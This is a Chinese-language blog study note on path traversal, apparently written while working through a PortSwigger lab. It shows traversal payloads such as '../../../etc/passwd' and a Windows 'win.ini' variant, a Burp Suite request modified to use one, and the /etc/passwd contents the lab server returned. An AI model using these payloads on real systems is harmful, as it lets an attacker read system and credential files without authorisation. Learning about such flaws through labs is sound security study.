{"title":"Path Traversal(Directory Traversal) 學習筆記","date":"2024-01-24T08:33:00.000Z","date_formatted":{"ll":"Jan 24, 2024","L":"01/24/2024","MM-DD":"01-24"},"author":"plusC","link":"Path-Traversal-學習筆記","tags":["Web Security","portswigger","學習筆記"],"categories":["筆記"],"updated":"2024-01-24T08:41:21.147Z","content":"<h2 id=\"攻擊危害\">攻擊危害<a title=\"#攻擊危害\" href=\"#攻擊危害\"></a></h2>\n<p>攻擊者可以讀取任意伺服器端的檔案，可能包含</p>\n<ul>\n<li>應用程式 code 跟 data</li>\n<li>後端憑證 (Credentials)</li>\n<li>敏感 OS 檔案</li>\n</ul>\n<p>假如還可以寫的話，就可以更改應用程式資料或行為，最終可能可以拿到伺服器的完整控制權</p>\n<h2 id=\"攻擊手法\">攻擊手法<a title=\"#攻擊手法\" href=\"#攻擊手法\"></a></h2>\n<h3 id=\"讀取任意檔案\">讀取任意檔案<a title=\"#讀取任意檔案\" href=\"#讀取任意檔案\"></a></h3>\n<p>假如今天網站上有一張圖片：</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=<span class=\"string\">&quot;/loadImage?filename=218.png&quot;</span>&gt;</span><br></pre></td></tr></table></figure>\n<p>這張圖片透過 filesystem API 去讀取 <code>/var/www/images/218.png</code></p>\n<p>這樣的話攻擊者可以下列 URL 去讀取 <code>/etc/passwd</code> ：</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">https</span>:<span class=\"comment\">//insecure-website.com/loadImage?filename=../../../etc/passwd</span></span><br></pre></td></tr></table></figure>\n<p>也就是讀取 <code>/var/www/images/../../../etc/passwd</code> 路徑</p>\n<p>p.s. 在 Windows 中，<code>../</code> 跟 <code>..\\</code> 都是合法的寫法，以下是針對基於 Windows 的伺服器的等效攻擊範例：</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">https</span>:<span class=\"comment\">//insecure-website.com/loadImage?filename=..\\..\\..\\windows\\win.ini</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"lab\">Lab<a title=\"#lab\" href=\"#lab\"></a></h2>\n<p>實際用 Burp Suite 去抓網頁中 image 的請求：</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable constant_\">GET</span> /image?filename=<span class=\"number\">13.</span>jpg <span class=\"variable constant_\">HTTP</span>/<span class=\"number\">2</span></span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>並修改成：</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable constant_\">GET</span> /image?filename=../../../etc/passwd <span class=\"variable constant_\">HTTP</span>/<span class=\"number\">2</span></span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n<p>回傳的內容就會是 <code>/etc/passwd</code> 檔案：</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable constant_\">HTTP</span>/<span class=\"number\">2</span> <span class=\"number\">200</span> <span class=\"variable constant_\">OK</span></span><br><span class=\"line\"><span class=\"title class_\">Content</span>-<span class=\"title class_\">Type</span>: image/jpeg</span><br><span class=\"line\">X-<span class=\"title class_\">Frame</span>-<span class=\"title class_\">Options</span>: <span class=\"variable constant_\">SAMEORIGIN</span></span><br><span class=\"line\"><span class=\"title class_\">Content</span>-<span class=\"title class_\">Length</span>: <span class=\"number\">2316</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">root</span>:<span class=\"attr\">x</span>:<span class=\"number\">0</span>:<span class=\"number\">0</span>:<span class=\"attr\">root</span>:<span class=\"regexp\">/root:/</span>bin/bash</span><br><span class=\"line\"><span class=\"attr\">daemon</span>:<span class=\"attr\">x</span>:<span class=\"number\">1</span>:<span class=\"number\">1</span>:<span class=\"attr\">daemon</span>:<span class=\"regexp\">/usr/</span><span class=\"attr\">sbin</span>:<span class=\"regexp\">/usr/</span>sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">bin</span>:<span class=\"attr\">x</span>:<span class=\"number\">2</span>:<span class=\"number\">2</span>:<span class=\"attr\">bin</span>:<span class=\"regexp\">/bin:/u</span>sr/sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">sys</span>:<span class=\"attr\">x</span>:<span class=\"number\">3</span>:<span class=\"number\">3</span>:<span class=\"attr\">sys</span>:<span class=\"regexp\">/dev:/u</span>sr/sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">sync</span>:<span class=\"attr\">x</span>:<span class=\"number\">4</span>:<span class=\"number\">65534</span>:<span class=\"attr\">sync</span>:<span class=\"regexp\">/bin:/</span>bin/sync</span><br><span class=\"line\"><span class=\"attr\">games</span>:<span class=\"attr\">x</span>:<span class=\"number\">5</span>:<span class=\"number\">60</span>:<span class=\"attr\">games</span>:<span class=\"regexp\">/usr/g</span><span class=\"attr\">ames</span>:<span class=\"regexp\">/usr/</span>sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">man</span>:<span class=\"attr\">x</span>:<span class=\"number\">6</span>:<span class=\"number\">12</span>:<span class=\"attr\">man</span>:<span class=\"regexp\">/var/</span>cache/<span class=\"attr\">man</span>:<span class=\"regexp\">/usr/</span>sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">lp</span>:<span class=\"attr\">x</span>:<span class=\"number\">7</span>:<span class=\"number\">7</span>:<span class=\"attr\">lp</span>:<span class=\"regexp\">/var/</span>spool/<span class=\"attr\">lpd</span>:<span class=\"regexp\">/usr/</span>sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">mail</span>:<span class=\"attr\">x</span>:<span class=\"number\">8</span>:<span class=\"number\">8</span>:<span class=\"attr\">mail</span>:<span class=\"regexp\">/var/m</span><span class=\"attr\">ail</span>:<span class=\"regexp\">/usr/</span>sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">news</span>:<span class=\"attr\">x</span>:<span class=\"number\">9</span>:<span class=\"number\">9</span>:<span class=\"attr\">news</span>:<span class=\"regexp\">/var/</span>spool/<span class=\"attr\">news</span>:<span class=\"regexp\">/usr/</span>sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">uucp</span>:<span class=\"attr\">x</span>:<span class=\"number\">10</span>:<span class=\"number\">10</span>:<span class=\"attr\">uucp</span>:<span class=\"regexp\">/var/</span>spool/<span class=\"attr\">uucp</span>:<span class=\"regexp\">/usr/</span>sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">proxy</span>:<span class=\"attr\">x</span>:<span class=\"number\">13</span>:<span class=\"number\">13</span>:<span class=\"attr\">proxy</span>:<span class=\"regexp\">/bin:/u</span>sr/sbin/nologin</span><br><span class=\"line\">www-<span class=\"attr\">data</span>:<span class=\"attr\">x</span>:<span class=\"number\">33</span>:<span class=\"number\">33</span>:www-<span class=\"attr\">data</span>:<span class=\"regexp\">/var/</span><span class=\"attr\">www</span>:<span class=\"regexp\">/usr/</span>sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">backup</span>:<span class=\"attr\">x</span>:<span class=\"number\">34</span>:<span class=\"number\">34</span>:<span class=\"attr\">backup</span>:<span class=\"regexp\">/var/</span><span class=\"attr\">backups</span>:<span class=\"regexp\">/usr/</span>sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">list</span>:<span class=\"attr\">x</span>:<span class=\"number\">38</span>:<span class=\"number\">38</span>:<span class=\"title class_\">Mailing</span> <span class=\"title class_\">List</span> <span class=\"title class_\">Manager</span>:<span class=\"regexp\">/var/</span><span class=\"attr\">list</span>:<span class=\"regexp\">/usr/</span>sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">irc</span>:<span class=\"attr\">x</span>:<span class=\"number\">39</span>:<span class=\"number\">39</span>:<span class=\"attr\">ircd</span>:<span class=\"regexp\">/var/</span>run/<span class=\"attr\">ircd</span>:<span class=\"regexp\">/usr/</span>sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">gnats</span>:<span class=\"attr\">x</span>:<span class=\"number\">41</span>:<span class=\"number\">41</span>:<span class=\"title class_\">Gnats</span> <span class=\"title class_\">Bug</span>-<span class=\"title class_\">Reporting</span> <span class=\"title class_\">System</span> (admin):<span class=\"regexp\">/var/</span>lib/<span class=\"attr\">gnats</span>:<span class=\"regexp\">/usr/</span>sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">nobody</span>:<span class=\"attr\">x</span>:<span class=\"number\">65534</span>:<span class=\"number\">65534</span>:<span class=\"attr\">nobody</span>:<span class=\"regexp\">/nonexistent:/u</span>sr/sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">_apt</span>:<span class=\"attr\">x</span>:<span class=\"number\">100</span>:<span class=\"number\">65534</span>::<span class=\"regexp\">/nonexistent:/u</span>sr/sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">peter</span>:<span class=\"attr\">x</span>:<span class=\"number\">12001</span>:<span class=\"number\">12001</span>::<span class=\"regexp\">/home/</span><span class=\"attr\">peter</span>:<span class=\"regexp\">/bin/</span>bash</span><br><span class=\"line\"><span class=\"attr\">carlos</span>:<span class=\"attr\">x</span>:<span class=\"number\">12002</span>:<span class=\"number\">12002</span>::<span class=\"regexp\">/home/</span><span class=\"attr\">carlos</span>:<span class=\"regexp\">/bin/</span>bash</span><br><span class=\"line\"><span class=\"attr\">user</span>:<span class=\"attr\">x</span>:<span class=\"number\">12000</span>:<span class=\"number\">12000</span>::<span class=\"regexp\">/home/u</span><span class=\"attr\">ser</span>:<span class=\"regexp\">/bin/</span>bash</span><br><span class=\"line\"><span class=\"attr\">elmer</span>:<span class=\"attr\">x</span>:<span class=\"number\">12099</span>:<span class=\"number\">12099</span>::<span class=\"regexp\">/home/</span><span class=\"attr\">elmer</span>:<span class=\"regexp\">/bin/</span>bash</span><br><span class=\"line\"><span class=\"attr\">academy</span>:<span class=\"attr\">x</span>:<span class=\"number\">10000</span>:<span class=\"number\">10000</span>::<span class=\"regexp\">/academy:/</span>bin/bash</span><br><span class=\"line\"><span class=\"attr\">messagebus</span>:<span class=\"attr\">x</span>:<span class=\"number\">101</span>:<span class=\"number\">101</span>::<span class=\"regexp\">/nonexistent:/u</span>sr/sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">dnsmasq</span>:<span class=\"attr\">x</span>:<span class=\"number\">102</span>:<span class=\"number\">65534</span>:dnsmasq,,,:<span class=\"regexp\">/var/</span>lib/<span class=\"attr\">misc</span>:<span class=\"regexp\">/usr/</span>sbin/nologin</span><br><span class=\"line\">systemd-<span class=\"attr\">timesync</span>:<span class=\"attr\">x</span>:<span class=\"number\">103</span>:<span class=\"number\">103</span>:systemd <span class=\"title class_\">Time</span> <span class=\"title class_\">Synchronization</span>,,,:<span class=\"regexp\">/run/</span><span class=\"attr\">systemd</span>:<span class=\"regexp\">/usr/</span>sbin/nologin</span><br><span class=\"line\">systemd-<span class=\"attr\">network</span>:<span class=\"attr\">x</span>:<span class=\"number\">104</span>:<span class=\"number\">105</span>:systemd <span class=\"title class_\">Network</span> <span class=\"title class_\">Management</span>,,,:<span class=\"regexp\">/run/</span><span class=\"attr\">systemd</span>:<span class=\"regexp\">/usr/</span>sbin/nologin</span><br><span class=\"line\">systemd-<span class=\"attr\">resolve</span>:<span class=\"attr\">x</span>:<span class=\"number\">105</span>:<span class=\"number\">106</span>:systemd <span class=\"title class_\">Resolver</span>,,,:<span class=\"regexp\">/run/</span><span class=\"attr\">systemd</span>:<span class=\"regexp\">/usr/</span>sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">mysql</span>:<span class=\"attr\">x</span>:<span class=\"number\">106</span>:<span class=\"number\">107</span>:<span class=\"title class_\">MySQL</span> <span class=\"title class_\">Server</span>,,,:<span class=\"regexp\">/nonexistent:/</span>bin/<span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"attr\">postgres</span>:<span class=\"attr\">x</span>:<span class=\"number\">107</span>:<span class=\"number\">110</span>:<span class=\"title class_\">PostgreSQL</span> administrator,,,:<span class=\"regexp\">/var/</span>lib/<span class=\"attr\">postgresql</span>:<span class=\"regexp\">/bin/</span>bash</span><br><span class=\"line\"><span class=\"attr\">usbmux</span>:<span class=\"attr\">x</span>:<span class=\"number\">108</span>:<span class=\"number\">46</span>:usbmux daemon,,,:<span class=\"regexp\">/var/</span>lib/<span class=\"attr\">usbmux</span>:<span class=\"regexp\">/usr/</span>sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">rtkit</span>:<span class=\"attr\">x</span>:<span class=\"number\">109</span>:<span class=\"number\">115</span>:<span class=\"title class_\">RealtimeKit</span>,,,:<span class=\"regexp\">/proc:/u</span>sr/sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">mongodb</span>:<span class=\"attr\">x</span>:<span class=\"number\">110</span>:<span class=\"number\">117</span>::<span class=\"regexp\">/var/</span>lib/<span class=\"attr\">mongodb</span>:<span class=\"regexp\">/usr/</span>sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">avahi</span>:<span class=\"attr\">x</span>:<span class=\"number\">111</span>:<span class=\"number\">118</span>:<span class=\"title class_\">Avahi</span> mDNS daemon,,,:<span class=\"regexp\">/var/</span>run/avahi-<span class=\"attr\">daemon</span>:<span class=\"regexp\">/usr/</span>sbin/nologin</span><br><span class=\"line\">cups-pk-<span class=\"attr\">helper</span>:<span class=\"attr\">x</span>:<span class=\"number\">112</span>:<span class=\"number\">119</span>:user <span class=\"keyword\">for</span> cups-pk-helper service,,,:<span class=\"regexp\">/home/</span>cups-pk-<span class=\"attr\">helper</span>:<span class=\"regexp\">/usr/</span>sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">geoclue</span>:<span class=\"attr\">x</span>:<span class=\"number\">113</span>:<span class=\"number\">120</span>::<span class=\"regexp\">/var/</span>lib/<span class=\"attr\">geoclue</span>:<span class=\"regexp\">/usr/</span>sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">saned</span>:<span class=\"attr\">x</span>:<span class=\"number\">114</span>:<span class=\"number\">122</span>::<span class=\"regexp\">/var/</span>lib/<span class=\"attr\">saned</span>:<span class=\"regexp\">/usr/</span>sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">colord</span>:<span class=\"attr\">x</span>:<span class=\"number\">115</span>:<span class=\"number\">123</span>:colord colour management daemon,,,:<span class=\"regexp\">/var/</span>lib/<span class=\"attr\">colord</span>:<span class=\"regexp\">/usr/</span>sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">pulse</span>:<span class=\"attr\">x</span>:<span class=\"number\">116</span>:<span class=\"number\">124</span>:<span class=\"title class_\">PulseAudio</span> daemon,,,:<span class=\"regexp\">/var/</span>run/<span class=\"attr\">pulse</span>:<span class=\"regexp\">/usr/</span>sbin/nologin</span><br><span class=\"line\"><span class=\"attr\">gdm</span>:<span class=\"attr\">x</span>:<span class=\"number\">117</span>:<span class=\"number\">126</span>:<span class=\"title class_\">Gnome</span> <span class=\"title class_\">Display</span> <span class=\"title class_\">Manager</span>:<span class=\"regexp\">/var/</span>lib/<span class=\"attr\">gdm3</span>:<span class=\"regexp\">/bin/</span><span class=\"literal\">false</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"參考資料\">參考資料<a title=\"#參考資料\" href=\"#參考資料\"></a></h2>\n<p><a href=\"https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/path-traversal-apprentice/file-path-traversal/what-is-path-traversal\" target=\"_blank\">https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/path-traversal-apprentice/file-path-traversal/what-is-path-traversal</a></p>\n","prev":{"title":"Access Control 學習筆記","link":"Access-Control-學習筆記"},"next":{"title":"MatchTheRegex - writeup","link":"MatchTheRegex-writeup"},"plink":"https://pluscat.me/Path-Traversal-學習筆記/","toc":[{"id":"攻擊危害","title":"攻擊危害","index":"1"},{"id":"攻擊手法","title":"攻擊手法","index":"2","children":[{"id":"讀取任意檔案","title":"讀取任意檔案","index":"2.1"}]},{"id":"lab","title":"Lab","index":"3"},{"id":"參考資料","title":"參考資料","index":"4"}],"reading_time":"772 words in 5 min"}